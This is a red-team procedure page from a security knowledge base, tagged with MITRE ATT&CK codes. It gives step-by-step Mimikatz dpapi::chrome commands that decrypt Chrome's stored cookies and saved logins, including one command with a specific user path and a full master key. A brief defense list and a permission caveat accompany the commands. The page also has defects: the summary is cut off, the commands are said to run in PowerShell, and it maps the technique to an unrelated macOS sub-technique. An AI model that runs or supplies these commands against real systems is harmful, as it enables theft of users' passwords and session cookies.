---
id: 06d466be-903e-4b89-9feb-f54d2f6620a5
name: Stealing Chrome Cookies and Credentials with Mimikatz
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.517549+00:00'
updated_at: '2023-04-10T20:37:19.487242+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Credentials from Password Stores|T1555 - Credentials from Password Stores]]'
sub_techniques:
- '[[Securityd Memory|T1555.002 - Securityd Memory]]'
tags:
- '[[Chrome Cookies & Credential]]'
- '[[Credential Manager & DPAPI]]'
- '[[Windows - Mimikatz]]'
commands:
- '[[Decrypt Chrome Cookies]]'
- '[[Decrypt Chrome Credentials]]'
---

# Stealing Chrome Cookies and Credentials with Mimikatz

## Summary

Stealing Chrome cookies and credentials with Mimikatz is a common technique used by attackers to gain access to sensitive data stored in the browser. The technique involves dumping the credentials stored in the Windows Credential Manager and decrypting them using the DPAPI. Once the credentials are

## Description

# Description

Stealing Chrome cookies and credentials with Mimikatz is a common technique used by attackers to gain access to sensitive data stored in the browser. The technique involves dumping the credentials stored in the Windows Credential Manager and decrypting them using the DPAPI. Once the credentials are obtained, attackers can use them to gain access to other systems and applications.

From a technical perspective, this technique involves using Mimikatz to execute commands that retrieve the encrypted credentials from the Windows Credential Manager, and then using Mimikatz again to decrypt them using the DPAPI. Business value of this technique is that it allows attackers to gain access to sensitive data stored in the browser, such as login credentials, which can be used to gain access to other systems and applications that the user has access to.

 

## Requirements

1. Access to a Windows machine with Mimikatz installed

1. Administrative privileges on the target machine

 

## Defense

1. Implement strong password policies to prevent attackers from easily obtaining credentials

1. Use multi-factor authentication to make it more difficult for attackers to gain access to sensitive data

1. Monitor for signs of Mimikatz usage and other credential dumping techniques

 

## Objectives

1. Retrieve Chrome cookies and saved credentials from the Windows Credential Manager

1. Decrypt the credentials using the DPAPI

 

# Instructions

1. To retrieve Chrome cookies and saved credentials, open PowerShell and run the following commands:

1. dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
2. dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
3. dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect

 



**Code**: [[# Saved Cookies
dpapi::chrome /in:"%localappdata%\]]



> These commands use the Data Protection API (DPAPI) to decrypt and display the saved cookies and credentials in Google Chrome. The first command retrieves the cookies from the default Chrome profile, while the second command retrieves the cookies from a specific user profile by providing the master key. The third command retrieves the saved credentials from the default Chrome profile. Note that these commands should only be run on a system that you own or have explicit permission to access, as they can potentially expose sensitive information.



**Command** ([[Decrypt Chrome Cookies]]):

```bash
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
```





**Command** ([[Decrypt Chrome Credentials]]):

```bash
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Credentials from Password Stores|T1555 - Credentials from Password Stores]]

### Sub-Techniques

- [[Securityd Memory|T1555.002 - Securityd Memory]]

## Commands Used

- [[Decrypt Chrome Cookies]]
- [[Decrypt Chrome Credentials]]

## Tags

- [[Chrome Cookies & Credential]]
- [[Credential Manager & DPAPI]]
- [[Windows - Mimikatz]]


